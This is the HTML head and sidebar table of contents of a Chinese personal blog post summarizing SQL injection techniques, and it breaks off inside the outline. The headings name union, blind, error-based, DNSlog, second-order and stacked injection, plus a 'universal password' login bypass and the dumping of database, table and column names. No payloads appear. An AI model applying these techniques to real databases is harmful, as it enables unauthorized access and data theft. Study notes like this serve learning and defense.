<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.0.0">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/icon_32.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/icon_16.png">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"hdfzzf.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.9.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
<meta name="description" content="个人对于SQL注入的知识点的总结。">
<meta property="og:type" content="article">
<meta property="og:title" content="SQL注入总结">
<meta property="og:url" content="https://hdfzzf.github.io/2022/04/28/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/index.html">
<meta property="og:site_name" content="HDFZZF&#39;s BLOG">
<meta property="og:description" content="个人对于SQL注入的知识点的总结。">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220423191054.png">
<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220423191151.png">
<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220423195759.png">
<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220423195819.png">
<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220423195842.png">
<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220423200014.png">
<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220423200344.png">
<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424205612.png">
<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424205834.png">
<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424215405.png">
<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424215447.png">
<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220423193717.png">
<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220423193701.png">
<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220423195043.png">
<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220423195103.png">
<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220423195227.png">
<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220423195241.png">
<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220423201606.png">
<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220423201720.png">
<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220423205609.png">
<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220423211816.png">
<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220423214751.png">
<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220423214943.png">
<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220423215300.png">
<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220423215629.png">
<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220423224736.png">
<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220423223836.png">
<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220423224352.png">
<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220423224404.png">
<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220423225107.png">
<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220423225604.png">
<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220423225641.png">
<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220423225924.png">
<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220423230114.png">
<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220423230126.png">
<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220423230715.png">
<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220423231443.png">
<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220423231520.png">
<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220423232255.png">
<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424100523.png">
<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424090503.png">
<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424090452.png">
<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424093426.png">
<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424102801.png">
<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424195335.png">
<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424200853.png">
<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424201435.png">
<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424205332.png">
<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424213751.png">
<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424214307.png">
<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424214458.png">
<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424214548.png">
<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220426204540.png">
<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220426223232.png">
<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220426223917.png">
<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318210614.png">
<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220427103611.png">
<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220427103735.png">
<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220427104643.png">
<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220427105208.png">
<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220428104333.png">
<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220428104400.png">
<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220428105320.png">
<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220428104446.png">
<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220428112925.png">
<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413094801.png">
<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413095201.png">
<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413095240.png">
<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413095352.png">
<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413101422.png">
<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413101617.png">
<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413101830.png">
<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413102429.png">
<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413102723.png">
<meta property="article:published_time" content="2022-04-27T16:00:00.000Z">
<meta property="article:modified_time" content="2022-04-28T05:12:48.547Z">
<meta property="article:author" content="hdfzzf">
<meta property="article:tag" content="SQL注入">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220423191054.png">


<link rel="canonical" href="https://hdfzzf.github.io/2022/04/28/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://hdfzzf.github.io/2022/04/28/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/","path":"2022/04/28/SQL注入总结/","title":"SQL注入总结"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>SQL注入总结 | HDFZZF's BLOG</title>
  





  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>
  <a target="_blank" rel="noopener" href="https://github.com/hdfzzf" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#151513; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>

  <main class="main">
    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">HDFZZF's BLOG</p>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu">
        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li>
        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li>
        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li>
        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup"><div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" maxlength="80"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close" role="button">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="search-result-container no-result">
  <div class="search-result-icon">
    <i class="fa fa-spinner fa-pulse fa-5x"></i>
  </div>
</div>

    </div>
  </div>

</div>
        
  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>

  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="nav-text">1. SQL注入基础知识</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFsql%E6%B3%A8%E5%85%A5"><span class="nav-text">1.1. 什么是SQL注入？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B8%B8%E8%A7%84sql%E6%B3%A8%E5%85%A5%E5%88%86%E7%B1%BB"><span class="nav-text">1.2. 常规SQL注入分类</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sql%E5%B8%B8%E8%A7%81%E8%AF%AD%E5%8F%A5%E6%A0%BC%E5%BC%8F"><span class="nav-text">1.3. SQL常见语句格式</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E5%BF%85%E5%A4%87%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="nav-text">1.4. 数据库必备知识点</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B3%A8%E9%87%8A%E6%96%B9%E5%BC%8F"><span class="nav-text">1.4.1. 注释方式</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%B8%B8%E8%A7%84%E6%B3%A8%E9%87%8A"><span class="nav-text">1.4.1.1. 常规注释</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%86%85%E8%81%94%E6%B3%A8%E9%87%8A"><span class="nav-text">1.4.1.2. 内联注释</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%80%BB%E8%BE%91%E8%BF%90%E7%AE%97"><span class="nav-text">1.5. 逻辑运算</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8B%AC%E5%8F%B7%E7%9A%84%E9%97%AE%E9%A2%98"><span class="nav-text">1.6. 括号的问题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%96%E5%88%AB%E5%90%8D"><span class="nav-text">1.7. 取别名</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%BA%E5%AD%97%E6%AE%B5%E5%8F%96%E5%88%AB%E5%90%8D"><span class="nav-text">1.7.1. 为字段取别名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%BA%E8%A1%A8%E5%8F%96%E5%88%AB%E5%90%8D"><span class="nav-text">1.7.2. 为表取别名</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E6%AC%A1%E6%89%A7%E8%A1%8C%E5%A4%9A%E6%9D%A1sql%E8%AF%AD%E5%8F%A5"><span class="nav-text">1.8. 一次执行多条sql语句</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%A2%84%E7%BC%96%E8%AF%91"><span class="nav-text">1.9. 预编译</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%B8%B8%E8%A7%84%E6%B3%A8%E5%85%A5%E6%96%B9%E6%B3%95%E8%AF%A6%E8%A7%A3"><span class="nav-text">2. 常规注入方法详解</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B3%A8%E5%85%A5%E4%B9%8B%E5%89%8D%E7%9A%84%E6%AD%A5%E9%AA%A4"><span class="nav-text">2.1. 注入之前的步骤</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC12%E4%BB%B6%E4%BA%8B"><span class="nav-text">2.1.1. 第1，2件事</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC3%E4%BB%B6%E4%BA%8B"><span class="nav-text">2.1.2. 第3件事</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81"><span class="nav-text">2.2. 万能密码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5"><span class="nav-text">2.3. 联合查询注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%9C%80%E8%A6%81%E7%94%A8%E5%88%B0%E7%9A%84%E5%87%BD%E6%95%B0"><span class="nav-text">2.3.1. 需要用到的函数</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#ordergroup-by"><span class="nav-text">2.3.1.1. order&#x2F;group by</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#order-by"><span class="nav-text">2.3.1.1.1. order by</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#group-by"><span class="nav-text">2.3.1.1.2. group by</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#union-select"><span class="nav-text">2.3.1.2. union select</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#group_concat"><span class="nav-text">2.3.1.3. group_concat()</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A4%E6%96%AD%E5%AD%97%E6%AE%B5%E6%95%B0%E5%B9%B6%E7%A1%AE%E5%AE%9A%E5%9B%9E%E6%98%BE%E4%BD%8D"><span class="nav-text">2.3.2. 判断字段数并确定回显位</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A4%E6%96%AD%E5%AD%97%E6%AE%B5%E6%95%B0"><span class="nav-text">2.3.2.1. 判断字段数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%A1%AE%E5%AE%9A%E5%9B%9E%E6%98%BE%E4%BD%8D"><span class="nav-text">2.3.2.2. 确定回显位</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D"><span class="nav-text">2.3.3. 获取数据库名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E7%89%B9%E5%AE%9A%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%8B%E7%9A%84%E6%89%80%E6%9C%89%E8%A1%A8%E5%90%8D"><span class="nav-text">2.3.4. 获取特定数据库下的所有表名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E7%89%B9%E5%AE%9A%E8%A1%A8%E4%B8%8B%E9%9D%A2%E7%9A%84%E6%89%80%E6%9C%89%E5%88%97%E5%90%8D"><span class="nav-text">2.3.5. 获取特定表下面的所有列名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E8%8E%B7%E5%8F%96%E7%89%B9%E5%AE%9A%E5%88%97%E7%9A%84%E4%BF%A1%E6%81%AF"><span class="nav-text">2.3.6. 获取获取特定列的信息</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%95%AA%E5%A4%96"><span class="nav-text">2.3.7. 番外</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="nav-text">2.4. 布尔盲注</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%9C%80%E8%A6%81%E7%94%A8%E5%88%B0%E7%9A%84%E5%87%BD%E6%95%B0-1"><span class="nav-text">2.4.1. 需要用到的函数</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#length"><span class="nav-text">2.4.1.1. length()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#substr-substring-mid"><span class="nav-text">2.4.1.2. substr(), substring(), mid()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#left-right-substring_index"><span class="nav-text">2.4.1.3. left(), right(), substring_index()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ascii-ord"><span class="nav-text">2.4.1.4. ascii(), ord()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#limit-poslen"><span class="nav-text">2.4.1.5. limit pos,len</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A4%E6%96%AD%E6%95%B0%E6%8D%AE%E5%BA%93%E9%95%BF%E5%BA%A6"><span class="nav-text">2.4.2. 判断数据库长度</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%88%86%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D"><span class="nav-text">2.4.3. 爆数据库名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%88%86%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%8Bgroup_concattable_name%E7%9A%84%E9%95%BF%E5%BA%A6"><span class="nav-text">2.4.4. 爆数据库下group_concat(table_name)的长度</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%88%86%E5%AF%B9%E5%BA%94%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%8B%E7%9A%84%E6%89%80%E6%9C%89%E8%A1%A8%E5%90%8D"><span class="nav-text">2.4.5. 爆对应数据库下的所有表名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%88%86%E5%AF%B9%E5%BA%94%E8%A1%A8%E4%B8%8B%E7%9A%84group_concatcolumn_name%E7%9A%84%E9%95%BF%E5%BA%A6"><span class="nav-text">2.4.6. 爆对应表下的group_concat(column_name)的长度</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%88%86%E5%AF%B9%E5%BA%94%E8%A1%A8%E4%B8%8B%E7%9A%84%E6%89%80%E6%9C%89%E5%AD%97%E6%AE%B5%E5%90%8D"><span class="nav-text">2.4.7. 爆对应表下的所有字段名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%88%86%E5%AF%B9%E5%BA%94%E5%AD%97%E6%AE%B5%E7%9A%84group_concatcolumnname%E7%9A%84%E9%95%BF%E5%BA%A6"><span class="nav-text">2.4.8. 爆对应字段的group_concat(columnName)的长度</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%88%86%E5%AF%B9%E5%BA%94%E5%AD%97%E6%AE%B5%E7%9A%84%E4%BF%A1%E6%81%AF"><span class="nav-text">2.4.9. 爆对应字段的信息</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="nav-text">2.5. 时间盲注</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%9C%80%E8%A6%81%E7%94%A8%E5%88%B0%E7%9A%84%E5%87%BD%E6%95%B0-2"><span class="nav-text">2.5.1. 需要用到的函数</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#if"><span class="nav-text">2.5.1.1. if()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#sleep"><span class="nav-text">2.5.1.2. sleep()</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%87%E7%A8%8B"><span class="nav-text">2.5.2. 过程</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="nav-text">2.6. 报错注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#exp"><span class="nav-text">2.6.1. exp()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#updatexml-extractvalue"><span class="nav-text">2.6.2. updatexml(), extractvalue()</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#updatexml"><span class="nav-text">2.6.2.1. updatexml()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#extractvalue"><span class="nav-text">2.6.2.2. extractvalue()</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#floor-rand"><span class="nav-text">2.6.3. floor(), rand()</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#floor"><span class="nav-text">2.6.3.1. floor()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#rand"><span class="nav-text">2.6.3.2. rand()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%A4%E8%80%85%E9%85%8D%E5%90%88"><span class="nav-text">2.6.3.3. 两者配合</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%9D%9E%E5%B8%B8%E8%A7%84%E6%B3%A8%E5%85%A5%E6%96%B9%E6%B3%95"><span class="nav-text">3. 非常规注入方法</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8A%A0%E8%A7%A3%E5%AF%86%E6%B3%A8%E5%85%A5"><span class="nav-text">3.1. 加解密注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#dnslog%E6%B3%A8%E5%85%A5"><span class="nav-text">3.2. DNSlog注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5"><span class="nav-text">3.3. 二次注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E6%AC%A1%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5"><span class="nav-text">3.4. 二次查询注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8E%9F%E7%90%86"><span class="nav-text">3.4.1. 原理</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="nav-text">3.5. 堆叠注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8E%9F%E7%90%86-1"><span class="nav-text">3.5.1. 原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8"><span class="nav-text">3.5.2. 利用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%A2%84%E7%BC%96%E8%AF%91-1"><span class="nav-text">3.5.2.1. 预编译</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%94%B9%E8%A1%A8%E5%90%8D"><span class="nav-text">3.5.2.2. 改表名</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#handlermysql%E4%B8%93%E5%B1%9E"><span 